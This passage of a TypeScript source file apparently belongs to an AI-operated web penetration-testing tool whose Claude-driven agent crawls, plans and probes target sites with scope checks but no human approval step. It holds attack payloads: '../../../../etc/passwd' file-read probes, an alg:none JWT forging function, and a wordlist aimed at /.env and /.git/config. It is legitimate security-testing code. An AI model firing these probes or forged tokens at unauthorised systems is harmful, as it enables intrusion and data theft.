// Claude が操縦するツール箱(in-process MCP)。既存の決定論 primitive を Claude のツールへ格下げ。
// スコープ/マーカー/レートはツール内で強制(= 安全弁は残すが、人間承認では止めない)。
//
// 3 ステージ(調査 / 方法論 / 診断)で使うツールはここに全部定義し、run.ts が allowedTools で
// ステージごとに見せるツールを絞る(= Claude に一度に全部見せない → 省略を防ぐ)。

import type { AssessmentStore, Finding, Screen, ScopePolicy, Severity } from "@veritas/core";
import { isInScope } from "@veritas/core";
import type { LoginCreds, Observation, PlaywrightDriver } from "@veritas/crawler";
import { InventoryBuilder, normalizePath, smartLogin } from "@veritas/crawler";
import type { LlmClient } from "@veritas/llm";
import type { BurpAuditConn, EvidenceStore, FetchHttpClient, HttpRequest, HttpResponse } from "@veritas/scanner";
import { oobPayload, oobPoll } from "@veritas/scanner";
import { tool } from "@anthropic-ai/claude-agent-sdk";
import { z } from "zod";
import { join } from "node:path";
import { readFileSync } from "node:fs";

/** attended(手動マルチセッション)で 1 ロール = 1 永続コンテキスト。生きたセッションを保持する。 */
export interface RoleSession {
  driver: PlaywrightDriver;
  /** 直近に同期した Cookie ヘッダ(http 経路用)。keepalive で再同期される。 */
  cookie: string;
}

export interface PilotSession {
  /** 現在アクティブなロールの driver。attended では login() でロール間を swap する。 */
  driver: PlaywrightDriver;
  http: FetchHttpClient;
  evidence: EvidenceStore;
  store: AssessmentStore;
  assessmentId: string;
  /** runs/<id>/artifacts。画面スクショを screens/<screenId>.png に保存。 */
  artifactsDir: string;
  scope: ScopePolicy;
  targetUrl: string;
  roleCreds: Map<string, LoginCreds>;
  /** ロール名 → 事前取得 Cookie ファイルのパス(資格情報の代わり。自動ログインできない壁向け)。 */
  roleCookieFiles: Map<string, string>;
  /** ロール名 → 権限の自由記述(例: "全権管理者" / "一般ユーザ(読取のみ)")。auth-diff の高/低権限判断に使う。 */
  roleDescriptions: Map<string, string>;
  loginLlm: LlmClient;
  currentCookie: string;
  /** SPA が保持する Bearer JWT(localStorage 等)。cookie 認証でない API(Juice Shop 等)向けに
   *  http_request / probe_logic が `Authorization: Bearer` として載せる。login() が各ロールで更新。 */
  currentBearer: string;
  currentRole: string;
  findings: Finding[];
  findCounter: number;
  /** dedup キー(class×endpoint×param)→ 既存 finding。横断エンドポイントの過剰報告を束ねる。 */
  findingsByKey: Map<string, Finding>;
  /** verify_access の機械判定(正規化 endpoint → verdict)。record_finding が auth-bypass を硬く gate する。 */
  accessVerdicts: Map<string, AccessVerdict>;
  /** record_finding 呼び出し回数(新規+マージ)。画面の verdict 判定に使う。 */
  recordCalls: number;
  // ── 認証壁サーキットブレーカ用の http 統計(診断プローブの応答) ──
  /** 診断プローブの総数。 */
  httpProbes: number;
  /** うち 401(認証壁)で弾かれた数。 */
  httpAuthWall: number;
  /** うち 2xx(認証を抜けて通った)数。 */
  httpThrough: number;
  /** 現在の画面で撃った診断プローブ数(画面開始でリセット)。screen_done のカバレッジ・ゲートの裏取りに使う
   *  (「全部 clean」と自己申告しつつ実は1回も probe してない、を弾く)。 */
  screenProbes: number;
  done: boolean;
  doneSummary: string;
  /** done の中でも「トークン/利用上限の枯渇で中断」= スキップではなく resume 可能な一時停止。
   *  立つと最終処理が phase を report に落とさず、診断中だった画面も queued に戻す(再診断できる)。 */
  paused: boolean;
  model: string | undefined;
  // ── ステージ運用の状態 ──
  /** 観測 → Screen 化 + dedup(assess と同じ台帳)。 */
  inv: InventoryBuilder;
  /** 訪問済み URL(ハッシュ除去)。 */
  visited: Set<string>;
  /** スコープ内・未訪問リンク(調査の残タスク=省略防止の frontier)。 */
  frontier: Set<string>;
  /** ignore_paths でモデルが動的に間引いた低価値パスのパターン(CMS コンテンツ木など)。frontier 追加時に弾く。 */
  ignorePaths: string[];
  /** 全量抽出モード(--exhaustive)。true なら ignore_paths は無効(全画面マップ)。 */
  exhaustive: boolean;
  /** URL リストのハードロック。true なら recordObservation で発見リンクを frontier に積まない
   *  (横断クロールせず、シード URL だけをマップする)。 */
  lockToSeeds: boolean;
  /** screenId → 方法論(攻撃計画)。 */
  plans: Map<string, string>;
  /** 診断中の screenId(record_finding / http_request evidence の紐付け先)。 */
  currentScreenId: string | null;
  /** 直近画面の診断結果(screen_done が設定)。 */
  screenVerdict: "finding" | "clean" | null;
  // ── ステージ完了シグナル ──
  surveyDone: boolean;
  methodologyDone: boolean;
  screenDone: boolean;
  /** シナリオ(A04 横断ロジック)ステージの完了シグナル。 */
  scenarioDone: boolean;
  /** OOB(Burp Collaborator)基盤への接続。set されていれば probe_oob が使える(BURP_AUDIT_API 経由)。
   *  ブラインド SSRF/XXE/SQLi 等の out-of-band 確証用。未設定なら probe_oob は not-available を返す。 */
  oob?: BurpAuditConn;
  // ── attended(手動マルチセッション認証)──
  /** 手動ログイン済みのロール別ライブセッション。未指定 = 通常(単一コンテキスト)モード。 */
  roleSessions?: Map<string, RoleSession>;
}

/** ステージごとに見せるツール(基底名)。run.ts が `mcp__veritas__` を付けて allowedTools に渡す。 */
export const STAGE_TOOLS = {
  survey: ["browser_navigate", "browser_fill", "browser_click", "login", "probe_paths", "ignore_paths", "survey_status", "survey_done"],
  methodology: ["get_inventory", "record_methodology", "methodology_done"],
  diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_redirect", "probe_jwt", "probe_csrf", "probe_oob", "probe_logic", "analyze_session", "verify_access", "browser_navigate", "browser_fill", "browser_click", "record_finding", "screen_done"],
  // シナリオ(A04 横断ロジック): inventory 俯瞰 + 多段リクエスト連鎖を probe_scenario で撃つ。画面診断の後に1回。
  scenario: ["get_inventory", "login", "http_request", "probe_scenario", "record_finding", "scenario_done"],
} as const;

const txt = (s: string): { content: { type: "text"; text: string }[] } => ({ content: [{ type: "text", text: s }] });

function pick(h: Record<string, string>, keys: string[]): Record<string, string> {
  const o: Record<string, string> = {};
  for (const k of keys) if (h[k] !== undefined) o[k] = h[k];
  return o;
}

/** frontier/visited の正準キー。SPA ルート(#/foo, #!/foo)は別画面の識別子として残し、
 *  ページ内アンカー(#, #section, 空の #/)は捨てる。これで hash ルーティングの SPA(Angular 等)が
 *  系統的にマップされる。画面レベルの重複は domSkeletonHash が別途担保するので過剰増殖はしない。 */
export function stripHash(u: string): string {
  const i = u.indexOf("#");
  if (i < 0) return u;
  return /^#!?\/.+/.test(u.slice(i)) ? u : u.slice(0, i);
}

const SEV_ORDER: Severity[] = ["info", "low", "medium", "high", "critical"];
function maxSev(a: Severity, b: Severity): Severity {
  return SEV_ORDER.indexOf(a) >= SEV_ORDER.indexOf(b) ? a : b;
}

/** vulnClass の自由文 → 粗いカテゴリ(dedup キー用)。同じ穴の言い換えを1つに畳む。
 *  正準カテゴリ(CATEGORIES)を渡された場合はそのまま返す(冪等。xss-stored の誤畳み防止)。 */
export function coarseClass(vulnClass: string): string {
  const s = vulnClass.toLowerCase().trim();
  if ((CATEGORIES as readonly string[]).includes(s)) return s; // 正準カテゴリはそのまま(冪等)
  // ハイフン/アンダースコアを空白に正規化(methodology の "SQL-injection"/"stored-XSS" 等の言い換えに強く)。
  const sn = s.replace(/[_-]+/g, " ");
  if (/stored xss|persistent xss/.test(sn)) return "xss-stored";
  if (/xss|cross\s?site script/.test(sn)) return "xss-reflected";
  if (/path travers|arbitrary file|file read|\blfi\b|directory travers|cwe 22/.test(sn)) return "path-traversal";
  if (/\bsqli\b|sql inj/.test(sn)) return "sqli";
  if (/idor|bola|object\s?level|broken access|broken object/.test(sn))
    return /write|overwrite|update|modif|edit/.test(sn) ? "idor-write" : "idor";
  if (/open redirect|unvalidated redirect/.test(sn)) return "open-redirect";
  if (/\bssrf\b/.test(sn)) return "ssrf";
  if (/\brce\b|command inj|remote code|template inj|\bssti\b/.test(sn)) return "rce";
  if (/rate limit|lockout|brute\s?force/.test(sn)) return "rate-limit";
  if (/security header|missing header|response header/.test(sn)) return "headers";
  if (/\bcsrf\b|cross\s?site request/.test(sn)) return "csrf";
  return s.replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "").slice(0, 24) || "other";
}

/** エンドポイントを inventory と同じ規則で正規化(/orders/o10 と /orders/{id} を同一視)。
 *  具体 URL(/orders/o10)もテンプレ(/orders/{id})も同じキーに落とす。 */
export function normEndpoint(ep: string, base: string): string {
  let path: string;
  try {
    path = decodeURIComponent(new URL(ep, base).pathname);
  } catch {
    path = ep.split("?")[0] ?? ep;
  }
  try {
    return normalizePath(path).template;
  } catch {
    return path.toLowerCase();
  }
}

/** finding dedup キー = (粗カテゴリ × 正規化エンドポイント × param)。同一穴の重複報告を1つに束ねる。 */
export function dedupKey(vulnClass: string, endpoint: string, param: string | undefined, base: string): string {
  return `${coarseClass(vulnClass)}::${normEndpoint(endpoint, base)}::${param ?? ""}`;
}

/** record_finding の正準クラス(分類の一貫性 + 安定した dedup キー)。 */
export const CATEGORIES = [
  "idor",
  "idor-write",
  "xss-reflected",
  "xss-stored",
  "sqli",
  "path-traversal",
  "open-redirect",
  "ssrf",
  "rce",
  "auth-bypass",
  "session",
  "csrf",
  "info-disclosure",
  "misconfig",
  "rate-limit",
  "headers",
  // A04 ビジネスロジック(差分テスト verifier = probe_logic で確証)
  "price-tampering",
  "qty-tampering",
  "workflow-bypass",
  "mass-assignment",
  "race-condition",
  "other",
] as const;

/** ビジネスロジック系(probe_logic の差分テスト + record_finding のマーカーベース確証を使う)。 */
export const BUSINESS_LOGIC_CATEGORIES = new Set<string>(["price-tampering", "qty-tampering", "workflow-bypass", "mass-assignment"]);

/** 「特定マーカーがレスポンスに現れたら確証」型のカテゴリ(長さ差分でなくマーカー有無で判定)。
 *  ビジネスロジック(probe_logic/probe_scenario)＋ 反射 XSS(未エスケープ反射)＋ open-redirect(Location が OOB)。 */
export const MARKER_BASED_CATEGORIES = new Set<string>([...BUSINESS_LOGIC_CATEGORIES, "xss-reflected", "xss-stored", "open-redirect"]);

/** probe_paths の「簡単なディレクトリリスト」= 未リンク endpoint を踏むための厳選ワードリスト。
 *  ※ logout/signout 系は **入れない**。認証済みセッションで GET するとサーバ側セッションが破棄され、
 *    以降の認証診断が全滅する(自滅)。isSessionDestroyingPath でも二重に弾く。 */
const PATH_WORDLIST = [
  "/admin", "/administrator", "/api", "/api/profile", "/api/users", "/api/user", "/api/orders", "/api/admin", "/api/config",
  "/account", "/account/edit", "/profile", "/settings", "/users", "/user", "/dashboard",
  "/status", "/health", "/healthz", "/metrics", "/debug", "/server-status", "/actuator", "/info", "/version",
  "/config", "/.env", "/.git/config", "/backup", "/robots.txt", "/sitemap.xml",
  "/login", "/register", "/signup", "/upload", "/uploads", "/files", "/download",
  "/search", "/orders", "/cart", "/checkout", "/support", "/continue", "/redirect", "/go",
  "/swagger", "/api-docs", "/graphql", "/.well-known/security.txt",
];

/** セッションを破棄する副作用を持つパス(logout/signout/SSO ログアウト等)。認証済みアセスメントで
 *  自動踏破するとサーバ側セッションが消えて以降の認証診断が全部死ぬため、probe_paths は絶対に踏まない。 */
const SESSION_DESTROYING = /(^|\/)(logout|log-out|logoff|log-off|signout|sign-out|sign_out|disconnect|(sso|saml|oidc|oauth2?|account|auth|session|user)\/(logout|signout|sign-out))(\/|$|\?|#)/i;
export function isSessionDestroyingPath(pathOrUrl: string): boolean {
  let p = pathOrUrl;
  try {
    p = new URL(pathOrUrl, "http://x/").pathname;
  } catch {
    /* 相対/不正はそのまま判定 */
  }
  return SESSION_DESTROYING.test(p);
}

/** 外部到達を試さない安全マーカー(open-redirect / 反射検出用、非解決ドメイン)。 */
const OOB_MARKER = "veritas-oob.example";

/** probe_params の高シグナルな隠しパラメータ集合(アプリが普段送らないもの)。 */
const PARAM_PROBES: Array<{ name: string; value: string; kind: "idor" | "redirect" | "debug" | "file" }> = [
  ...["id", "userId", "user_id", "user", "account", "accountId", "uid", "customerId", "orderId", "order"].map(
    (name) => ({ name, value: "1", kind: "idor" as const }),
  ),
  ...["to", "next", "url", "redirect", "returnUrl", "return", "continue", "dest", "callback"].map(
    (name) => ({ name, value: `https://${OOB_MARKER}/`, kind: "redirect" as const }),
  ),
  ...["debug", "test", "admin", "isAdmin", "verbose", "trace"].map((name) => ({ name, value: "1", kind: "debug" as const })),
  ...["file", "path", "filename", "template", "page", "include"].map(
    (name) => ({ name, value: "../../../../etc/passwd", kind: "file" as const }),
  ),
];

/** probe_scenario の {{var}} 置換。文字列中の {{name}} を vars[name] で差し替え(未定義は空文字)。 */
export function substVars(input: string, vars: Record<string, string>): string {
  return input.replace(/\{\{\s*([A-Za-z0-9_.]+)\s*\}\}/g, (_, k: string) => vars[k] ?? "");
}

/** レスポンス本文から値を抽出(probe_scenario の capture)。まず JSON パス(dot/array index 例 data.0.id)、
 *  失敗したら正規表現の第1キャプチャ。取れなければ null。前段の id/token を後段に差し込むための土台。 */
export function extractValue(body: string, expr: string): string | null {
  // ① JSON パス
  try {
    const json = JSON.parse(body);
    let cur: unknown = json;
    for (const seg of expr.split(".")) {
      if (cur == null) break;
      const idx = /^\d+$/.test(seg) ? Number(seg) : seg;
      cur = (cur as Record<string | number, unknown>)[idx];
    }
    if (cur != null && (typeof cur === "string" || typeof cur === "number" || typeof cur === "boolean")) return String(cur);
  } catch {
    /* not json — fall through to regex */
  }
  // ② 正規表現(第1キャプチャ、無ければマッチ全体)
  try {
    const m = new RegExp(expr).exec(body);
    if (m) return m[1] ?? m[0];
  } catch {
    /* invalid regex */
  }
  return null;
}

/** 現在ロールの認証材料(cookie + Bearer JWT)をヘッダ化。cookie 認証でない API(Juice Shop 等の
 *  `Authorization: Bearer <localStorage.token>`)にも届くよう bearer を載せる。呼び出し側ヘッダで上書き可能。 */
export function authHeaders(s: Pick<PilotSession, "currentCookie" | "currentBearer">): Record<string, string> {
  return {
    ...(s.currentCookie ? { cookie: s.currentCookie } : {}),
    ...(s.currentBearer ? { authorization: `Bearer ${s.currentBearer}` } : {}),
  };
}

function b64urlDecode(s: string): string {
  const pad = s.length % 4 === 0 ? "" : "=".repeat(4 - (s.length % 4));
  return Buffer.from(s.replace(/-/g, "+").replace(/_/g, "/") + pad, "base64").toString("utf8");
}
function b64urlEncode(s: string): string {
  return Buffer.from(s, "utf8").toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
}

/** JWT を alg:none で再エンコード(署名空)。サーバが署名検証していなければ受理される = 致命的偽造。
 *  header.alg を "none" に、payload はそのまま(mutate で claim 改変も可)。失敗時 null。 */
export function forgeAlgNone(token: string, mutate?: (claims: Record<string, unknown>) => void): string | null {
  const parts = token.split(".");
  if (parts.length < 2 || !parts[0] || !parts[1]) return null;
  let header: Record<string, unknown>;
  let payload: Record<string, unknown>;
  try {
    header = JSON.parse(b64urlDecode(parts[0]));
    payload = JSON.parse(b64urlDecode(parts[1]));
  } catch {
    return null;
  }
  header.alg = "none";
  if (mutate) mutate(payload);
  return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}.`;
}

/** ignore_paths のパターン照合。`*` をワイルドカードとして扱い、`*` を含まないパターンは前方一致。
 *  例: "/news/" は /news/ 配下すべて、"/artikel/*" も同様、"/p" は /p で始まる全パス。URL/相対どちらも path で判定。 */
export function pathIsIgnored(urlOrPath: string, patterns: ReadonlyArray<string>, base: string): boolean {
  if (patterns.length === 0) return false;
  let path: string;
  try {
    path = new URL(urlOrPath, base).pathname;
  } catch {
    path = urlOrPath.split("?")[0] ?? urlOrPath;
  }
  path = path.toLowerCase();
  return patterns.some((raw) => {
    const p = raw.toLowerCase().trim();
    if (!p) return false;
    if (p.includes("*")) {
      const rx = new RegExp(`^${p.split("*").map((s) => s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")).join(".*")}`);
      return rx.test(path);
    }
    return path.startsWith(p);
  });
}

/** login() で使えるロールの一覧(名前 + 任意の権限説明)。attended は生セッションのキー(純手動ロール含む)、
 *  通常は資格情報 + Cookie ファイルのキー。description は auth-diff で高/低権限を見分ける材料。 */
function availableRoles(s: PilotSession): Array<{ name: string; description?: string }> {
  const names = s.roleSessions ? [...s.roleSessions.keys()] : [...new Set([...s.roleCreds.keys(), ...s.roleCookieFiles.keys()])];
  return names.map((name) => {
    const description = s.roleDescriptions.get(name);
    return description ? { name, description } : { name };
  });
}

/** operator 提供の Cookie ファイルを読む。生 Cookie ヘッダ("a=1; b=2")/ Playwright storageState JSON
 *  ({cookies:[...]})/ 単純配列([{name,value}])を自動判別 → http 用ヘッダ + ブラウザ注入用 cookie。 */
export function loadCookieFile(
  path: string,
  targetUrl: string,
): { header: string; browserCookies: Array<{ name: string; value: string; domain: string; path: string }> } {
  const raw = readFileSync(path, "utf8").trim();
  let host = "";
  try {
    host = new URL(targetUrl).hostname;
  } catch {
    host = "";
  }
  // JSON(storageState or 配列)を試す
  try {
    const j = JSON.parse(raw) as unknown;
    const arr = Array.isArray(j) ? j : ((j as { cookies?: unknown[] }).cookies ?? []);
    const bc = (arr as Array<{ name?: string; value?: unknown; domain?: string; path?: string }>)
      .filter((c) => c && c.name)
      .map((c) => ({ name: c.name as string, value: String(c.value ?? ""), domain: c.domain || host, path: c.path || "/" }));
    if (bc.length > 0) return { header: bc.map((c) => `${c.name}=${c.value}`).join("; "), browserCookies: bc };
  } catch {
    /* JSON でない → 生ヘッダ扱い */
  }
  // 生 Cookie ヘッダ: "Cookie: a=1; b=2" または "a=1; b=2"
  const header = raw.replace(/^cookie:\s*/i, "").split(/\r?\n/)[0]?.trim() ?? "";
  const browserCookies = header
    .split(";")
    .map((s) => s.trim())
    .filter(Boolean)
    .map((kv) => {
      const i = kv.indexOf("=");
      return { name: kv.slice(0, i).trim(), value: kv.slice(i + 1).trim(), domain: host, path: "/" };
    })
    .filter((c) => c.name);
  return { header, browserCookies };
}

// ── auth-bypass の hybrid 判定: 機械が「明白に認証が効いてる」を veto、グレーだけ Claude に渡す ──
const LOGIN_MARKERS = /sign[\s-]?in|log[\s-]?in|\bpassword\b|forbidden|unauthorized|access denied|ログイン|サインイン|認証が必要|権限/i;
function looksLikeLogin(body: string): boolean {
  return LOGIN_MARKERS.test(body.slice(0, 4000));
}

/** attended の keepalive 用: ロールのコンテキストがログインへ戻された(= セッション失効)かを判定。
 *  URL パスが login/signin/auth/sso 系、または可視テキストがログイン文言 → dead 扱い(再ログイン要求)。 */
export function sessionLooksDead(snap: { url: string; visibleText: string }): boolean {
  let path = snap.url.toLowerCase();
  try {
    path = new URL(snap.url).pathname.toLowerCase();
  } catch {
    /* 相対/不正 URL はそのまま小文字で判定 */
  }
  if (/(^|\/)(login|signin|sign-in|auth|sso|account\/login)(\/|$|\?)/.test(path)) return true;
  return looksLikeLogin(snap.visibleText);
}

export type AccessVerdict = "not_bypass" | "needs_judgment" | "inconclusive";

/** 未認証/認証済みレスポンス → auth-bypass の機械判定。
 *  302→login / 401 / 403 / 非200 / ログイン本文 は **not_bypass(認証が効いてる、覆せない)**。
 *  未認証200 かつ 非ログインだけ **needs_judgment**(Claude が本文を読んで保護データか判断)。 */
export function classifyAccess(
  unauth: { status: number; location?: string; body: string },
  auth: { status: number; body: string } | null,
): { verdict: AccessVerdict; reason: string } {
  if (unauth.status >= 300 && unauth.status < 400)
    return { verdict: "not_bypass", reason: `unauth → ${unauth.status} redirect${unauth.location ? ` (${unauth.location})` : ""} = auth enforced` };
  if (unauth.status === 401 || unauth.status === 403)
    return { verdict: "not_bypass", reason: `unauth → ${unauth.status} = auth enforced` };
  if (unauth.status !== 200)
    return { verdict: "not_bypass", reason: `unauth → ${unauth.status} (no protected content)` };
  if (looksLikeLogin(unauth.body)) return { verdict: "not_bypass", reason: "unauth body is a login/denied page, not protected content" };
  // ここまで来たら unauth 200 & 非ログイン = グレー
  if (!auth) return { verdict: "inconclusive", reason: "no authenticated session to compare — login(role) first" };
  if (auth.status >= 300 || looksLikeLogin(auth.body))
    return { verdict: "inconclusive", reason: "authenticated baseline is itself login/redirect — cannot establish protected content" };
  return { verdict: "needs_judgment", reason: "unauth returned 200 & non-login; judge whether it IS the protected content" };
}

/** 観測リンクから frontier に積むべき in-scope URL を返す(純粋)。
 *  ハードロック(URL リスト固定)では空 = 発見リンクを辿らない(横断クロールしない)。
 *  out-of-scope / logout 系 / ignore_paths / 訪問済みは除外。 */
export function frontierLinks(
  o: Pick<Observation, "finalUrl" | "links"> & { virtualRoutes?: string[] },
  s: Pick<PilotSession, "scope" | "lockToSeeds" | "visited" | "ignorePaths" | "targetUrl">,
): string[] {
  if (s.lockToSeeds) return [];
  const out = new Set<string>();
  // 通常のリンクに加え、driver が pushState/hashchange で採取した SPA 仮想ルートも frontier に積む
  // (hash ルーティングの SPA は href が collapse しがちなので、実際に踏んだルートを起点に補う)。
  for (const link of [...o.links, ...(o.virtualRoutes ?? [])]) {
    let abs: string;
    try {
      abs = stripHash(new URL(link, o.finalUrl).toString());
    } catch {
      continue;
    }
    if (!isInScope(abs, s.scope)) continue;
    if (isSessionDestroyingPath(abs)) continue; // logout/signout リンクは frontier に積まない(踏むと自滅)
    if (pathIsIgnored(abs, s.ignorePaths, s.targetUrl)) continue; // モデルが間引いた低価値パスは積まない
    if (!s.visited.has(abs)) out.add(abs);
  }
  return [...out];
}

/** 診断プローブの応答ステータスを集計(認証壁サーキットブレーカ用)。401=壁、2xx=通過。 */
function bumpHttp(s: PilotSession, status: number): void {
  s.httpProbes += 1;
  s.screenProbes += 1; // 画面ごとの診断アクティビティ(screen_done ゲートの裏取り)
  if (status === 401) s.httpAuthWall += 1;
  else if (status >= 200 && status < 300) s.httpThrough += 1;
}

/** 画面プランの `classes=[a,b,c]` 接頭辞から、計画した攻撃クラスを正準化して取り出す(カバレッジ・ゲート用)。
 *  info-disclosure/headers/misconfig 等の「単発で出る」クラスは網羅強制の対象外(プランに無くても発見されうる)。 */
export function plannedClassesFor(plan: string | undefined): string[] {
  if (!plan) return [];
  const m = /^classes=\[([^\]]*)\]/.exec(plan);
  if (!m) return [];
  const raw = (m[1] ?? "").split(",").map((c) => c.trim()).filter(Boolean);
  // 受動的・機会的に見つかるクラス(計画に書かれてもアクティブ網羅の強制対象にしない)。
  const EXCLUDED = new Set(["other", "headers", "info-disclosure", "misconfig"]);
  const out = new Set<string>();
  for (const c of raw) {
    const cc = coarseClass(c);
    if (cc && !EXCLUDED.has(cc)) out.add(cc);
  }
  return [...out];
}

/** screen_done のカバレッジ・ゲート(純粋)。計画した攻撃クラスを coverage が全部説明していて、かつ
 *  「tested-clean/found を主張するなら最低1回は probe している」ことを要求する。満たさなければ差し戻し理由を返す。
 *  プランにクラスが無い画面(計画なし/info系のみ)はゲート対象外(従来どおり閉じれる)。 */
export function checkScreenCoverage(
  planned: string[],
  coverage: ReadonlyArray<{ class: string; result: string }>,
  screenProbes: number,
): { ok: true } | { ok: false; reason: string } {
  if (planned.length === 0) return { ok: true };
  const covered = new Set(coverage.map((c) => coarseClass(c.class)));
  const missing = planned.filter((p) => !covered.has(p));
  if (missing.length > 0) {
    return {
      ok: false,
      reason: `the plan named ${planned.length} attack class(es); you haven't accounted for: ${missing.join(", ")}. Test each (record_finding) or pass a coverage entry marking it tested-clean / not-applicable(reason). Do NOT stop at the first finding.`,
    };
  }
  const claimsTested = coverage.some((c) => c.result === "tested-clean" || c.result === "found");
  if (claimsTested && screenProbes === 0) {
    return {
      ok: false,
      reason: `coverage claims classes were tested, but no probe (http_request / probe_params / probe_logic / verify_access) was fired on this screen. Actually exercise the plan before closing.`,
    };
  }
  return { ok: true };
}

/** survey_done の認証ゲート(純関数): ロールが設定されているのに認証セッションが立っていなければ拒否。
 *  匿名のまま survey を閉じると post-login サーフェスが丸ごと未マップになり、画面数が静かに半減する。
 *  authActive = currentCookie か Bearer が非空か(currentRole が立つだけでは不可 — attended は誤陽性になる)。 */
export function surveyAuthGate(roleCount: number, authActive: boolean): { ok: true } | { ok: false } {
  return roleCount > 0 && !authActive ? { ok: false } : { ok: true };
}

/** 証拠規律の構造チェック(純粋・カテゴリ非依存)。runValidator と同じ規律を pilot finding に強制する:
 *  (1) positive replay が ≥2 で互いに安定(status 一致・本文長が ±64 以内)= 再現性、
 *  (2) negative control が positive と区別できる(status 違い or 本文長差 >64)= catch-all でない実差分。
 *  これを満たさない record_finding は reject する(幻/弱い finding の主要 FP モードを封じる)。 */
export function checkEvidenceDiscipline(
  neg: { status: number; bodyLen: number },
  positives: ReadonlyArray<{ status: number; bodyLen: number }>,
): { ok: true } | { ok: false; reason: string } {
  if (positives.length < 2) return { ok: false, reason: "need >=2 positive replays" };
  const p0 = positives[0]!;
  const stable = positives.every((p) => p.status === p0.status && Math.abs(p.bodyLen - p0.bodyLen) <= 64);
  if (!stable) return { ok: false, reason: "the positive replays disagree (status or body length differ) — unstable / not reproducible" };
  const differs = neg.status !== p0.status || Math.abs(neg.bodyLen - p0.bodyLen) > 64;
  if (!differs) return { ok: false, reason: "the negative control is indistinguishable from the positives (same status & body length) — catch-all / no real effect" };
  return { ok: true };
}

/** ビジネスロジックの証拠規律(純粋・マーカーベース)。長さ差分ではなく「操作が効いた印(effectMarker)」で判定する:
 *  改変リクエスト(positive)で marker が出て、正規リクエスト(control)では出ず、positive が ≥2 で安定&受理(<400)なら ok。
 *  price=1 が通る/role=admin が反映される 等、status/長さがほぼ同じでも意味的差分を捉える。 */
export function checkLogicEvidence(
  control: { status: number; hasMarker: boolean },
  positives: ReadonlyArray<{ status: number; hasMarker: boolean }>,
): { ok: true } | { ok: false; reason: string } {
  if (positives.length < 2) return { ok: false, reason: "need >=2 positive replays of the manipulated request" };
  if (control.hasMarker) return { ok: false, reason: "the effectMarker is ALSO present in the legitimate baseline — pick a marker that only appears when the manipulation takes effect" };
  if (!positives.every((p) => p.hasMarker)) return { ok: false, reason: "the effectMarker is absent in a manipulated replay — the manipulation was not accepted (not confirmed)" };
  if (!positives.every((p) => p.status < 400)) return { ok: false, reason: "a manipulated replay was rejected (status >=400) — not accepted" };
  if (!positives.every((p) => p.status === positives[0]!.status)) return { ok: false, reason: "manipulated replays disagree (unstable)" };
  return { ok: true };
}

/** 認証壁サーキットブレーカ判定(純粋): 十分なサンプルがあり、何も通らず(2xx ゼロ)、finding ゼロで、
 *  ほぼ全部 401 なら true。診断ループはこれが立ったら以降の画面を止めて handoff を上げる。 */
export function isAuthWalled(
  s: { findings: { length: number }; httpProbes: number; httpThrough: number; httpAuthWall: number },
  minSample = 12,
): boolean {
  return s.findings.length === 0 && s.httpProbes >= minSample && s.httpThrough === 0 && s.httpAuthWall / s.httpProbes >= 0.85;
}

/** 観測 1 件を screens に永続化(自動でカバレッジ台帳 queued 登録)し、frontier を更新。 */
function recordObservation(s: PilotSession, o: Observation): { screen: Screen; isNew: boolean } {
  const authState = s.currentRole ? "post-login" : "unauth";
  const { screen, isNew } = s.inv.ingest(o, authState);
  s.store.upsertScreen(s.assessmentId, screen);
  const here = stripHash(o.finalUrl);
  s.visited.add(here);
  s.frontier.delete(here);
  // 画面 + その API は記録済み(上の ingest)。ハードロックなら発見リンクは積まない(frontierLinks が [])。
  for (const abs of frontierLinks(o, s)) s.frontier.add(abs);
  return { screen, isNew };
}

/** 画面のスクショを artifacts/screens/<id>.png に保存し、screen.screenshot を更新(WebUI 表示用)。 */
async function captureScreenshot(s: PilotSession, screen: Screen): Promise<void> {
  if (screen.screenshot) return; // 既に撮影済み
  const rel = `screens/${screen.screenId}.png`;
  const okShot = await s.driver.saveScreenshot(join(s.artifactsDir, rel));
  if (okShot) {
    screen.screenshot = rel;
    s.store.upsertScreen(s.assessmentId, screen);
  }
}

/** インベントリ全体から、他画面で観測した識別子(IDOR 用)を集める。 */
function knownObjectIds(s: PilotSession): string[] {
  const out = new Set<string>();
  for (const sc of s.inv.screens()) {
    for (const p of sc.params) {
      if ((p.guessedType === "object_ref" || p.guessedType === "id") && p.example) {
        out.add(`${p.name}=${p.example}`);
      }
    }
    for (const u of sc.observedUrls.slice(0, 4)) {
      const seg = u.split("?")[0]?.split("/").filter(Boolean).pop() ?? "";
      if (/[a-z]*\d{2,}|^[0-9a-f-]{6,}$/i.test(seg)) out.add(seg);
    }
  }
  return [...out].slice(0, 30);
}

function screenDigest(sc: Screen): Record<string, unknown> {
  return {
    screenId: sc.screenId,
    urlTemplate: sc.urlTemplate,
    authState: sc.authState,
    screenType: sc.screenType,
    labels: sc.labels,
    params: sc.params.map((p) => ({ name: p.name, in: p.in, type: p.guessedType })),
    apis: sc.apis.map((a) => ({ method: a.method, urlTemplate: a.urlTemplate })),
  };
}

export function buildTools(s: PilotSession) {
  return [
    // ───────────────────────── 調査(STAGE 1) ─────────────────────────
    tool(
      "browser_navigate",
      "Navigate the browser to an in-scope URL. Registers the page as a screen (auto-enrolled into the coverage ledger) and returns its screenId plus state and newly discovered in-scope links.",
      { url: z.string() },
      async ({ url }) => {
        if (!isInScope(url, s.scope)) return txt(`BLOCKED: ${url} is out of scope`);
        // logout/signout への遷移はセッションを破棄し以降の認証診断を全滅させるので踏まない。
        if (isSessionDestroyingPath(url))
          return txt(`SKIPPED: ${url} is a logout/sign-out path. Navigating to it would break the auth session and wipe out all subsequent diagnosis, so it is not visited.`);
        try {
          const o = await s.driver.visit(url);
          const { screen, isNew } = recordObservation(s, o);
          await captureScreenshot(s, screen);
          return txt(
            JSON.stringify({
              screenId: screen.screenId,
              isNew,
              finalUrl: o.finalUrl,
              status: o.status,
              title: o.title,
              text: o.visibleText.slice(0, 500),
              links: o.links.slice(0, 40),
              forms: o.forms,
              firedApis: o.apiCalls.map((a) => ({ method: a.method, url: a.url, status: a.status })).slice(0, 30),
              frontierRemaining: s.frontier.size,
            }),
          );
        } catch (e) {
          return txt(`ERROR navigating ${url}: ${String(e).slice(0, 200)}`);
        }
      },
    ),
    tool(
